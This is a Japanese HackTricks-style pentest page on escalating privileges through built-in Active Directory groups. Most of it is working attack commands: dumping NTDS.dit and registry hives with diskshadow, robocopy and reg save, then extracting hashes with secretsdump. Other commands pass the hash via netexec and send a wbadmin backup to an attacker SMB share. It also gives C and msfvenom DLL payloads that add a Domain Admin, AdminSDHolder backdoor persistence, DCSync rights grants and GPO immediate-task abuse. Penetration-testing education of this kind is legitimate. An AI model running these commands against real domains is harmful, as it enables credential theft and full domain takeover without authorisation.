# 特権グループ

{{#include ../../banners/hacktricks-training.md}}

## 管理権限を持つ既知のグループ

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

このグループには、ドメイン上で管理者ではないアカウントおよびグループを作成する権限があります。さらに、Domain Controller (DC) へのローカルログインが可能になります。

このグループのメンバーを特定するには、次のコマンドを実行します。
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
新しいユーザーの追加が許可されており、DC へのローカルログインも可能です。<sup>[[1]](#references)</sup>

## AdminSDHolder group

**AdminSDHolder** group の Access Control List (ACL) は、high-privilege groups を含む Active Directory 内のすべての「protected groups」に対する権限を設定するため、非常に重要です。この仕組みにより、承認されていない変更を防ぎ、これらの groups の security が確保されます。

攻撃者は、**AdminSDHolder** group の ACL を変更し、standard user に完全な権限を付与することで、この仕組みを悪用できます。これにより、その user はすべての protected groups を完全に制御できるようになります。この user の権限が変更または削除された場合でも、システムの設計により1時間以内に自動的に再付与されます。<sup>[[14]](#references)</sup>

最近の Windows Server documentation でも、複数の built-in operator groups が **protected** objects (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` など) として扱われています。**SDProp** process はデフォルトで60分ごとに **PDC Emulator** 上で実行され、`adminCount=1` を設定し、protected objects における inheritance を無効化します。これは persistence に役立つだけでなく、protected group から削除されたにもかかわらず、non-inheriting ACL を保持している stale privileged users の hunting にも役立ちます。<sup>[[12]](#references)</sup>

members を確認し、permissions を変更する commands は次のとおりです。
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
復元プロセスを迅速化するためのスクリプトが利用できます: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

詳細については、[ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)を参照してください。<sup>[[14]](#references)</sup>

## AD Recycle Bin

このグループのメンバーシップにより、削除された Active Directory オブジェクトを読み取れるため、機密情報が明らかになる可能性があります:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
これは**以前の権限パスの復元**に役立ちます。削除されたオブジェクトにも、`lastKnownParent`、`memberOf`、`sIDHistory`、`adminCount`、古いSPN、または後から別のoperatorによって復元される可能性がある、削除されたprivileged groupのDNが残っている場合があります。
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### ドメインコントローラーへのアクセス

DC上のファイルへのアクセスは、ユーザーが `Server Operators` グループに所属していない限り制限されます。このグループに所属すると、アクセス権限のレベルが変わります。

### Privilege Escalation

Sysinternalsの `PsService` または `sc` を使用すると、サービスの権限を確認および変更できます。たとえば、`Server Operators` グループは特定のサービスを完全に制御できるため、任意のコマンドの実行やPrivilege Escalationが可能になります。<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
このコマンドにより、`Server Operators` が完全なアクセス権を持ち、権限昇格のためにサービスを操作できることが明らかになります。

## Backup Operators

`Backup Operators` グループのメンバーシップは、`SeBackup` および `SeRestore` 権限により、`DC01` のファイル システムへのアクセスを提供します。これらの権限により、明示的なアクセス許可がなくても、`FILE_FLAG_BACKUP_SEMANTICS` フラグを使用して、フォルダーの移動、一覧表示、ファイルのコピーが可能になります。このプロセスには、特定のスクリプトを使用する必要があります。<sup>[[1]](#references)</sup>

グループ メンバーを一覧表示するには、次を実行します：
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### ローカル攻撃

これらの権限をローカルで利用するには、以下の手順を実行します。

1. 必要なライブラリをインポートする:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` を有効化して確認する:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. たとえば、制限されたディレクトリからファイルにアクセスしてコピーする。
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller のファイルシステムへ直接アクセスすると、ドメインユーザーとコンピューターのすべての NTLM hashes が含まれる `NTDS.dit` データベースを盗み出せます。

#### `diskshadow.exe` の使用

1. `C` ドライブの shadow copy を作成します：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. シャドウコピーから `NTDS.dit` をコピーします:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
または、ファイルのコピーには `robocopy` を使用します:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. hash retrieval のために `SYSTEM` と `SAM` を抽出:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit` からすべてのハッシュを取得する:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-extraction: DA への Pass-the-Hash<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe の使用

1. 攻撃者のマシン上で SMB server 用の NTFS filesystem をセットアップし、target machine 上で SMB credentials を cache します。
2. `wbadmin.exe` を使用して system backup と `NTDS.dit` の extraction を行います。
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

**DnsAdmins** group のメンバーは、その privileges を悪用して、DNS server 上で SYSTEM privileges により任意の DLL を load できます。DNS server は Domain Controllers 上で host されていることが多いため、この capability によって大きな exploitation potential が生じます。

DnsAdmins group のメンバーを list するには、次を使用します:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 任意の DLL を実行 (CVE‑2021‑40469)

> [!NOTE]
> この脆弱性により、DNS service（通常は DCs 内）で SYSTEM 権限による任意の code の実行が可能になります。この問題は 2021 年に修正されました。

Members は、次のような commands を使用して、DNS server に任意の DLL（ローカルまたは remote share から）を load させることができます:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DLLをロードするには、DNS serviceの再起動（追加の権限が必要になる場合があります）が必要です：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
この攻撃ベクトルの詳細については、ired.teamを参照してください。

#### Mimilib.dll

コマンド実行にmimilib.dllを使用することも可能です。これを変更して、特定のコマンドやreverse shellを実行させます。詳細については、[この投稿を確認してください](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)。<sup>[[15]](#references)</sup>

### MitM用のWPADレコード

DnsAdminsは、global query block listを無効化した後にWPADレコードを作成することで、DNSレコードを操作してMan-in-the-Middle（MitM）攻撃を実行できます。ResponderやInveighなどのツールを使用して、ネットワークトラフィックのspoofingとキャプチャを行えます。

### Event Log Readers
Membersはevent logにアクセスでき、plaintext passwordやcommand executionの詳細などの機密情報を発見できる可能性があります。
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

このグループはドメインオブジェクトの DACL を変更でき、DCSync 権限を付与できる可能性があります。このグループを悪用した privilege escalation の手法は、Exchange-AD-Privesc GitHub repo に詳しく記載されています。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
このグループのメンバーとして行動できる場合、classic abuse は、攻撃者が制御する principal に [DCSync](dcsync.md) に必要な replication rights を付与することです。
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange** はメールボックスへのアクセス、Exchange 認証の強制、LDAP relay を連鎖させ、この同じ primitive に到達していました。relay の経路が緩和されている場合でも、`Exchange Windows Permissions` への直接的なメンバーシップや Exchange サーバーの制御は、ドメインのレプリケーション権限に到達する高価値な経路として残ります。

## Hyper-V Administrators

Hyper-V Administrators は Hyper-V への完全なアクセス権を持っており、これを悪用して仮想化されたドメイン コントローラーを制御できます。これには、稼働中の DC のクローン作成や、NTDS.dit ファイルからの NTLM ハッシュの抽出が含まれます。

### Exploitation Example

実際の abuse は、古いホストレベルの LPE トリックではなく、通常は **DC のディスクやチェックポイントへのオフラインアクセス** です。Hyper-V ホストにアクセスできる場合、operator は仮想化されたドメイン コントローラーのチェックポイントを作成またはエクスポートし、VHDX をマウントして、ゲスト内の LSASS に触れることなく `NTDS.dit`、`SYSTEM`、その他の secrets を抽出できます。
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
From there, `Backup Operators` の workflow を再利用して、`Windows\NTDS\ntds.dit` と registry hives を offline でコピーします。

## Group Policy Creators Owners

このグループでは、メンバーが domain 内で Group Policies を作成できます。ただし、メンバーは users または groups に group policies を適用したり、既存の GPOs を編集したりすることはできません。

重要な点は、**creator が新しい GPO の owner になり**、通常はその後に編集するために十分な権限を取得することです。つまり、次のいずれかが可能な場合、このグループは注目すべき対象になります。

- malicious GPO を作成し、admin を説得して target OU/domain に link させる
- 作成した GPO が、すでに有用な場所に link されている場合に編集する
- GPO を link できる別の delegated right を abuse し、このグループによって編集側の権限を得る

実際の abuse では通常、SYSVOL-backed policy files を通じて、**Immediate Task**、**startup script**、**local admin membership**、または **user rights assignment** の変更を追加します。<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
`SYSVOL` を通じて GPO を手動で編集する場合、変更だけでは不十分であることに注意してください。`versionNumber`、`GPT.ini`、さらに場合によっては `gPCMachineExtensionNames` も更新する必要があります。更新しないと、クライアントはポリシーの更新を無視します。<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange** が導入されている環境では、**Organization Management** と呼ばれる特別なグループが重要な権限を持ちます。このグループには、**すべてのドメインユーザーのメールボックスにアクセスする**権限があり、**'Microsoft Exchange Security Groups'** Organizational Unit (OU) に対する**フルコントロール**も保持しています。この制御には **`Exchange Windows Permissions`** グループも含まれており、権限昇格に悪用される可能性があります。

### 権限の悪用とコマンド

#### Print Operators

**Print Operators** グループのメンバーには、**`SeLoadDriverPrivilege`** を含む複数の権限が付与されています。この権限により、**Domain Controller にローカルログオン**し、シャットダウンしたり、プリンターを管理したりできます。これらの権限を悪用するには、特に権限の低いコンテキストで **`SeLoadDriverPrivilege`** が表示されない場合、User Account Control (UAC) のバイパスが必要です。<sup>[[1]](#references)</sup>

このグループのメンバーを一覧表示するには、次の PowerShell コマンドを使用します：
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
ドメイン コントローラーでは、既定の Domain Controller Policy により **`SeLoadDriverPrivilege`** が `Print Operators` に付与されるため、このグループは危険です。このグループのメンバーの elevated token を取得できれば、privilege を有効化し、署名済みだが脆弱な driver をロードして kernel/SYSTEM へ移行できます。<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> token の処理の詳細については、[Access Tokens](../windows-local-privilege-escalation/access-tokens.md) を確認してください。

#### Remote Desktop Users

このグループのメンバーには、Remote Desktop Protocol (RDP) 経由で PC へのアクセス権が付与されます。これらのメンバーを列挙するには、PowerShell コマンドを使用できます：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDPの悪用に関するさらなる知見は、専用のpentestingリソースで確認できます。

#### Remote Management Users

メンバーは **Windows Remote Management (WinRM)** を介してPCにアクセスできます。これらのメンバーの列挙は、以下によって実行できます：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** に関連する exploitation techniques については、特定のドキュメントを参照してください。

#### Server Operators

このグループには、Domain Controllers 上でさまざまな構成を実行する権限があります。これには、バックアップおよび復元の権限、システム時刻の変更、システムのシャットダウンが含まれます。<sup>[[1]](#references)</sup> メンバーを列挙するには、次のコマンドを実行します。
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
ドメインコントローラーでは、`Server Operators` は一般的に、**サービスを再構成したり、開始・停止したりする権限**を十分に継承しており、デフォルトの DC ポリシーを通じて `SeBackupPrivilege`/`SeRestorePrivilege` も付与されます。実際には、これにより **service-control abuse** と **NTDS extraction** の橋渡し役となります：
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
サービス ACL によりこのグループに変更および開始の権限が与えられている場合は、サービスの実行先を任意のコマンドに変更し、`LocalSystem` として起動してから、元の `binPath` に戻します。サービス制御が制限されている場合は、上記の `Backup Operators` の手法にフォールバックして `NTDS.dit` をコピーします。

## References

- [1] [ired.team – 特権アカウントとトークン権限](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Privilege Escalation のための SeLoadDriverPrivilege の悪用](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – GPO 権限の悪用](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse, Part 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – GPO と OU に関する Red Teamer 向けガイド](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – ZwLoadDriver 関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – 付録 C: Active Directory の保護されたアカウントとグループ](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – AdminSDHolder を悪用および Backdoor 化して Domain Admin の Persistence を取得する方法](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Active Directory における昇格のための DnsAdmins 権限の悪用](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – GenericAll エッジの悪用に関する情報](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – NtLoadDriver 関数 (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
